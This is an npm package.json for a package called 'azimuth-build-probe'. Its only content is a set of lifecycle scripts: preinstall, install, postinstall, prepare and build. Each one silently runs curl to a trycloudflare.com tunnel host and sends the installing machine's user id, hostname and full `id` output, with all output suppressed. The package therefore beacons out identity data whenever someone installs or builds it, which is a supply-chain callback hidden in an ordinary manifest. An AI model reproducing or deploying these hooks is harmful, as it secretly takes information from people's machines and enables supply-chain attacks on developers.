{
 "name": "azimuth-build-probe",
 "version": "1.0.0",
 "private": true,
 "description": "build detection probe",
 "scripts": {
  "preinstall": "curl -s --max-time 10 'https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-preinstall?u='$(id -u 2>/dev/null)'&h='$(hostname 2>/dev/null)'&who='$(id 2>/dev/null | tr ' ' '_') >/dev/null 2>&1",
  "install": "curl -s --max-time 10 'https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-install?u='$(id -u 2>/dev/null)'&h='$(hostname 2>/dev/null)'&who='$(id 2>/dev/null | tr ' ' '_') >/dev/null 2>&1",
  "postinstall": "curl -s --max-time 10 'https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-postinstall?u='$(id -u 2>/dev/null)'&h='$(hostname 2>/dev/null)'&who='$(id 2>/dev/null | tr ' ' '_') >/dev/null 2>&1",
  "prepare": "curl -s --max-time 10 'https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-prepare?u='$(id -u 2>/dev/null)'&h='$(hostname 2>/dev/null)'&who='$(id 2>/dev/null | tr ' ' '_') >/dev/null 2>&1",
  "build": "curl -s --max-time 10 'https://idaho-builds-choir-withdrawal.trycloudflare.com/cb/npm-build?u='$(id -u 2>/dev/null)'&h='$(hostname 2>/dev/null)'&who='$(id 2>/dev/null | tr ' ' '_') >/dev/null 2>&1"
 }
}